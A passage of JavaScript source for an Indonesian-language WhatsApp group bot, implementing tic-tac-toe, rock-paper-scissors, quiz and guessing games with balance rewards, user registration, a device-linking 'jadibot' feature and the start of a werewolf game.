// FUNCTION TICTACTOE BY SURYA
const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}

const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}

const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}

const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}

const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}

if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
znn.sendteks(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
users[m.sender].balance -= 1000
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
znn.sendteks(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
znn.sendteks(from, the2, m)
users[posi.penantang].balance += posi.hadiah
users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
znn.sendteks(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
znn.sendteks(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
znn.sendteks(from, the5, m)
users[posi.ditantang].balance += posi.hadiah
users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
znn.sendteks(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
znn.sendteks(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

// FUNCTION SUIT PVP POLLING BY znn
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
users[m.sender].balance -= 1000
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await znn.sendteks(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await znn.sendteks(from, ggy, fkontak2)
if (!roof.pilih) await znn.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await znn.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await znn.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
users[m.sender].balance -= 1000
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await znn.sendteks(from, sffp, fkontak2)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await znn.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fkontak2})
if (!roof.pilih2) await znn.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await znn.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await znn.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await znn.sendteks(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah : '+roof.hadiah+' balance'}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? users[roof.p].balance += roof.hadiah : users[roof.p].balance -= roof.hadiah
} else if (roof.p2 == win) {
roof.p2 == win ? users[roof.p2].balance += roof.hadiah : users[roof.p2].balance -= roof.hadiah
}
delete suit[roof.id]
}
}

// FUNCTION PETAK BOMB BY SURYA
let pilih = "🌀", bomb = "💣";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
znn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
await reply795(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`);
znn.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
minSaldo(sender, 100, db_saldo)
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await reply795(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
znn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
addSaldo(m.sender, 250, db_saldo)
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}

// GAME TEBAK GAMBAR BY znn

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
znn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else znn.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK ANIME BY SURYA
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
znn.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else znn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU BY SURYA
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebaklagu[from];
}
}

// GAME KUIS BY SURYA
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete kuis[from];
}
}

// GAME SIAPAKAH AKU BY SURYA
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete siapakahaku[from];
}
}

// GAME TEBAK KALIMAT BY SURYA
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebakkalimat[from];
}
}

// GAME TEBAK KATA BY SURYA
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebakkata[from];
}
}

// GAME TEBAK LIRIK BY SURYA
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebaklirik[from];
}
}

// GAME TEBAK KIMIA BY SURYA
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebakkimia[from];
}
}

// GAME TEBAK BENDERA BY SURYA
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete tebakbendera[from];
}
}

// GAME ASAH OTAK BY SURYA
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete asahotak[from];
}
}

// GAME SUSUN KATA BY SURYA
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete susunkata[from];
}
}

// GAME CAK LONTONG BY SURYA
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete caklontong[from];
}
}

// GAME KUIS MATH BY SURYA
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (body.includes(jawaban)) {
m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${soal}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users[sender].balance += hadiah
clearTimeout(waktu);
delete kuismath[from];
}
}

// GAME FAMILY 100 BY SURYA
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
users[sender].balance += hadiah
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

// FUNCTION BY znn
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
    
// FITUR MENGETIK
if (global.autoTyping) {
if (command) { znn.sendPresenceUpdate('composing', from)}}

/*
// AUTO READ MESSAGE
if (global.autoTyping) {
if (command) { znn.readMessages([m.key])}}
*/


















// FUNCTION JOIN BEFORE COMMAND BY znn
/*const metadata = await znn.groupMetadata (global.owner)
if (!metadata.participants.map(a => a.id).includes(m.sender)) {
if (command) return reply795(`${tag} anda belum bergabung kedalam group znn, harap bergabung terlebih dahulu sebelum menggunakan fitur ini\n\n${global.group}`)
}*/


// PENGALIH
switch (command) {

// FITUR USER
case 'daftar':
if (isRegistered) return reply('Kamu sudah terdaftar')
if (!q.includes('.')) return reply('*Format salah! Gunakan Dengan*\n\n    *Contoh :* .daftar x-znn.17')
const namaUser = q.substring(0, q.indexOf('.') - 0)
const umurUser = q.substring(q.lastIndexOf('.') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return reply('Umur harus berupa angka!!')
if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
if (umurUser <1) return reply(`your age is too young minimum 12 years`)
let mzd = `*DAFTAR BERHASIL*\n\n⎋ Nama : ${namaUser}\n⎋ Umur : ${umurUser}\n⎋ Nomor : @${m.sender.split("@")[0]}\n⎋ Premium : ${isPremium}\n⎋ Limit : ${limit}\n⎋ Register : ${calender}`
let veri = m.sender
if (!m.isGroup) {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
znn.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} Terdaftar ✅`, 
body: `powered by winn`, 
description: 'no text',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: `${global.saluran}`,
}}
})
} else {
addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
znn.sendMessage(from, {image: ppnyauser, caption: mzd, fileLength: 9999778866, contextInfo: {
externalAdReply: {
showAdAttribution: true, 
mediaType: 1, 
previewType: 'PHOTO',
renderLargerThumbnail: false, 
title: `${namaUser} Terdaftar ✅`, 
body: `powered by winn`, 
description: 'no text',
mediaType: 1,
thumbnail: ppnyauser,
sourceUrl: `${global.saluran}`,
}}
})
}
break
case 'totalfitur':
const totalFitur = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
reply(`Command znn Tersedia Sebanyak ${totalFitur()}`)
break
case 'listban': 
var data = Object.values(db.users).filter(v => v.banned)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂  *L I S T  B A N N E D*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
sendMessageModify(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})
break //Powered By znn & znn
case 'listprem': 
var data = Object.values(db.users).filter(v => v.premium)
if (data.length == 0) return reply('*Data kosong.*')
var teks = '乂  *L I S T  P R E M I U M*\n'
teks += data.map((v, i) => `\n${i + 1}. @${v.jid.split('@')[0]}`).join('\n')
sendMessageModify(m.chat, teks, m, {
thumbUrl: 'https://telegra.ph/file/ae4413e295ec14491d23b.png',
largeThumb: true
})
break //Powered By znn & znn
case 'carajadibot':
case 'cara-pasang':
let tutor1 = '*Step 1* ketik *start* untuk mendapat kode koneksi bot anda dari *znn*'
let tutor2 = '*Step 2* kembali ke home WhatsApp lalu klik *titik tiga* di samping pojok kanan atas, lalu klik *Perangkat tertaut*'
let tutor3 = '*Step 3* klik *Tautkan perangkat*'
let tutor4 = '*Step 4* untuk cara memasukan kode klik *Tautkan dengan nomor telepon saja*'
let tutor5 = '*Step 5* masukan kode anda'
let imej1 = "https://telegra.ph/file/37a9b2865634333b25168.jpg"
let imej2 = "https://telegra.ph/file/cba5cd9154a4ffc4b2ae4.jpg"
let imej3 = "https://telegra.ph/file/cb39c8ab221045fb4a6e7.jpg"
let imej4 = "https://telegra.ph/file/a11753d255c49c0decac2.jpg"
let imej5 = "https://telegra.ph/file/e97424c82f58caa3109a8.jpg"
reply('untuk cara penggunaan, ikuti panduan berikut')
await delay(3000)
reply('pertama, sebelum menggunakan bot')
await delay(3000)
reply('pastikan anda sudah tahu cara pemasangan untuk mengkoneksikan bot anda dengan *znn*')
await delay(3000)
reply('berikut adalah caranya')
await delay(3000)
znn.sendMessage(from, {image: {url: imej1}, caption: tutor1})
await delay(3000)
znn.sendMessage(from, {image: {url: imej2}, caption: tutor2})
await delay(3000)
znn.sendMessage(from, {image: {url: imej3}, caption: tutor3})
await delay(3000)
znn.sendMessage(from, {image: {url: imej4}, caption: tutor4})
await delay(3000)
znn.sendMessage(from, {image: {url: imej5}, caption: tutor5})
break
case 'jdb': case 'start': case 'jadibot': case 'buatbot':
//if (cekSaldo(sender,db_saldo) < 500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 500 untuk mengakses fitur ini, silahkan bermain game/topup untuk mendapat saldo`)
reply(mess.wait)
znnClone(znn, m, from)
//reply(`*[ Pay Success ] Rp.* 500`)
//minSaldo(sender, 500, db_saldo)
break //Powered By znn & znn
case 'stop': case 'stopjadibot':
reply(mess.wait)
rimraf.sync(`./userclone/${m.sender}`)
await delay(2000)
reply('suksess stop bot & sesi anda di hapus')
break
case 'listbot': case 'listjadibot': case 'userbot':
try {
let user = [... new Set([...global.conns.filter(znn => znn.user).map(znn => znn.user)])]
te = "*znn USERBOT*\n\n"
for (let i of user){
y = await znn.decodeJid(i.id)
te += " > User : @" + y.split("@")[0] + "\n"
te += " > Name : " + i.name + "\n\n"
}
//znn.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
reply795(te)
} catch (err) {
reply795(`Tidak ada user yang terkoneksi`)
}
break































// FITUR GAMES BY znn
      case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    znn.werewolf = znn.werewolf ? znn.werewolf : {};
    const ww = znn.werewolf ? znn.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        znn.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://chat.whatsapp.com/DZ3vdQavh4e97rpK99Eepe",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(znn. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(znn. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(znn. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
